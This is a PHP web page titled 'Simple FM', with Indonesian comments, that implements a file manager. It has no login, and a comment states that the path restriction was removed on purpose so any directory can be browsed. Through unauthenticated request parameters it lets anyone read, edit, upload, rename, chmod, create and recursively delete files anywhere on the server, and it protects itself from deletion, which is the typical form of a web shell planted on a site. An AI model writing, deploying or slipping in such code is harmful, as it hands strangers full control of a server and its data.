<?php
// Pengaturan Awal
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Tentukan direktori root tempat file ini berada.
// Ini adalah batas keamanan tertinggi.
$rootDir = realpath('.');
$requestedPath = isset($_GET['path']) ? $_GET['path'] : $rootDir;

// Pastikan jalur yang diminta adalah jalur absolut
$currentDir = realpath($requestedPath);

// **PEMBATASAN KEAMANAN TELAH DIHAPUS.**
// Tidak ada lagi pengecekan strpos(). Pengguna dapat menavigasi ke mana saja.
if (!$currentDir) {
    $currentDir = $rootDir;
}

// Fungsi untuk membuat breadcrumb yang bisa diklik dari path absolut
function createBreadcrumbs($path) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumbs = '';
    $currentPath = '';
    
    foreach ($parts as $part) {
        if ($part === '') {
            $currentPath .= '/';
            $breadcrumbs .= '<a href="?path=/">/</a>';
        } else {
            $currentPath .= $part . '/';
            $breadcrumbs .= ' / <a href="?path=' . urlencode($currentPath) . '">' . htmlspecialchars($part) . '</a>';
        }
    }
    
    return $breadcrumbs;
}

// ========================================================================================================
// FUNGSI-FUNGSI PENGOLAHAN FILE
// ========================================================================================================

// Aksi Hapus
if (isset($_GET['delete'])) {
    $target = realpath($_GET['delete']);
    if (file_exists($target) && basename($target) !== basename(__FILE__)) {
        if (is_dir($target)) {
            // Hapus direktori beserta isinya
            $items = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            foreach ($items as $item) {
                if ($item->isDir()) rmdir($item->getRealPath());
                else unlink($item->getRealPath());
            }
            rmdir($target);
        } else {
            unlink($target);
        }
    }
    header('Location: ?path=' . urlencode(dirname($target)));
    exit;
}

// Aksi Rename
if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $oldName = realpath($_POST['rename_old']);
    $newName = dirname($oldName) . '/' . basename($_POST['rename_new']);
    if (file_exists($oldName) && basename($oldName) !== basename(__FILE__)) {
        rename($oldName, $newName);
    }
    header('Location: ?path=' . urlencode(dirname($oldName)));
    exit;
}

// Aksi Upload
if (isset($_FILES['fileToUpload'])) {
    $targetFile = $currentDir . '/' . basename($_FILES['fileToUpload']['name']);
    if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile)) {
        // Sukses
    }
    header('Location: ?path=' . urlencode($currentDir));
    exit;
}

// Aksi Edit (Simpan)
if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $fileToEdit = realpath($_POST['edit_file']);
    if (is_file($fileToEdit)) {
        file_put_contents($fileToEdit, $_POST['file_content']);
    }
    header('Location: ?path=' . urlencode(dirname($fileToEdit)));
    exit;
}

// Aksi CHMOD (Ubah Izin)
if (isset($_POST['chmod_file']) && isset($_POST['new_chmod'])) {
    $fileToChmod = realpath($_POST['chmod_file']);
    $newChmod = $_POST['new_chmod'];
    if (file_exists($fileToChmod)) {
        chmod($fileToChmod, octdec($newChmod));
    }
    header('Location: ?path=' . urlencode(dirname($fileToChmod)));
    exit;
}

if (isset($_POST['create_dir'])) {
    mkdir($currentDir . '/' . $_POST['new_name']);
    header('Location: ?path=' . urlencode($currentDir));
    exit;
}
if (isset($_POST['create_file'])) {
    file_put_contents($currentDir . '/' . $_POST['new_name'], '');
    header('Location: ?path=' . urlencode($currentDir));
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple FM</title>
    <style>
        body { font-family: sans-serif; background-color: #f0f0f0; margin: 0; padding: 20px; }
        .container { max-width: 800px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1, h3 { color: #333; }
        a { color: #007bff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .nav-links a { margin-right: 15px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #f4f4f4; }
        tr:hover { background-color: #f9f9f9; }
        .action-links a { margin-right: 10px; }
        form { margin-top: 20px; }
        input[type="file"], input[type="text"] { padding: 8px; border: 1px solid #ccc; border-radius: 4px; }
        button, input[type="submit"] { padding: 8px 12px; background-color: #007bff; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
        textarea { width: 100%; height: 300px; border: 1px solid #ccc; padding: 10px; box-sizing: border-box; }
        pre { background-color: #f4f4f4; padding: 10px; border-radius: 4px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Manajer File Sederhana</h1>

        <p><strong>Lokasi:</strong> <?php echo createBreadcrumbs($currentDir); ?></p>
        <div class="nav-links">
            <a href="?path=<?php echo urlencode(dirname($currentDir)); ?>">.. (Naik)</a>
        </div>
        <hr>

        <h3>Unggah File</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload">
            <button type="submit">Unggah</button>
        </form>

        <h3>Buat File/Folder Baru</h3>
        <form method="post">
            <input type="text" name="new_name" placeholder="Nama File/Folder">
            <button type="submit" name="create_dir" value="true">Buat Folder</button>
            <button type="submit" name="create_file" value="true">Buat File</button>
        </form>

        <hr>

        <?php if (!isset($_GET['edit']) && !isset($_GET['rename_form']) && !isset($_GET['chmod_form'])): ?>
            <h3>Daftar Isi</h3>
            <table>
                <thead>
                    <tr>
                        <th>Nama</th>
                        <th>Aksi</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $items = array_diff(scandir($currentDir), ['.', '..']);
                    $dirs = [];
                    $files = [];
                    foreach ($items as $item) {
                        $itemPath = $currentDir . '/' . $item;
                        if (is_dir($itemPath)) {
                            $dirs[] = $item;
                        } else {
                            $files[] = $item;
                        }
                    }

                    // Tampilkan folder dulu
                    foreach ($dirs as $dir):
                        $dirPath = $currentDir . '/' . $dir;
                    ?>
                    <tr>
                        <td>
                            <a href="?path=<?php echo urlencode($dirPath); ?>"><?php echo htmlspecialchars($dir); ?>/</a>
                        </td>
                        <td class="action-links">
                            <a href="?path=<?php echo urlencode($currentDir); ?>&rename_form=<?php echo urlencode($dirPath); ?>">Ubah Nama</a>
                            <a href="?path=<?php echo urlencode($currentDir); ?>&delete=<?php echo urlencode($dirPath); ?>" onclick="return confirm('Yakin ingin menghapus ini?');">Hapus</a>
                            <a href="?path=<?php echo urlencode($currentDir); ?>&chmod_form=<?php echo urlencode($dirPath); ?>">CHMOD</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>

                    <?php
                    foreach ($files as $file):
                        $filePath = $currentDir . '/' . $file;
                    ?>
                    <tr>
                        <td>
                            <?php echo htmlspecialchars($file); ?>
                        </td>
                        <td class="action-links">
                            <a href="?path=<?php echo urlencode($currentDir); ?>&edit=<?php echo urlencode($filePath); ?>">✏️</a>
                            <a href="?path=<?php echo urlencode($currentDir); ?>&rename_form=<?php echo urlencode($filePath); ?>">📝</a>
                            <a href="?path=<?php echo urlencode($currentDir); ?>&delete=<?php echo urlencode($filePath); ?>" onclick="return confirm('Yakin ingin menghapus ini?');">🗑️</a>
                            <a href="?path=<?php echo urlencode($currentDir); ?>&chmod_form=<?php echo urlencode($filePath); ?>">🔑</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        <?php endif; ?>

        <?php if (isset($_GET['edit'])): ?>
            <h3>Edit File: <?php echo htmlspecialchars(basename($_GET['edit'])); ?></h3>
            <form method="post">
                <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
                <textarea name="file_content"><?php echo htmlspecialchars(file_get_contents($_GET['edit'])); ?></textarea>
                <button type="submit">Simpan</button>
            </form>
        <?php endif; ?>

        <?php if (isset($_GET['rename_form'])): ?>
            <h3>Ubah Nama: <?php echo htmlspecialchars(basename($_GET['rename_form'])); ?></h3>
            <form method="post">
                <input type="hidden" name="rename_old" value="<?php echo htmlspecialchars($_GET['rename_form']); ?>">
                <input type="text" name="rename_new" value="<?php echo htmlspecialchars(basename($_GET['rename_form'])); ?>">
                <button type="submit">Simpan</button>
            </form>
        <?php endif; ?>
        
        <?php if (isset($_GET['chmod_form'])): ?>
            <?php
                $fileToChmod = realpath($_GET['chmod_form']);
                $currentChmod = substr(sprintf('%o', fileperms($fileToChmod)), -4);
            ?>
            <h3>Ubah Izin: <?php echo htmlspecialchars(basename($_GET['chmod_form'])); ?></h3>
            <form method="post">
                <input type="hidden" name="chmod_file" value="<?php echo htmlspecialchars($_GET['chmod_form']); ?>">
                <label for="new_chmod">Izin Saat Ini: <?php echo htmlspecialchars($currentChmod); ?></label><br>
                <input type="text" name="new_chmod" id="new_chmod" value="<?php echo htmlspecialchars($currentChmod); ?>">
                <button type="submit">Simpan</button>
            </form>
        <?php endif; ?>
    </div>
</body>
</html>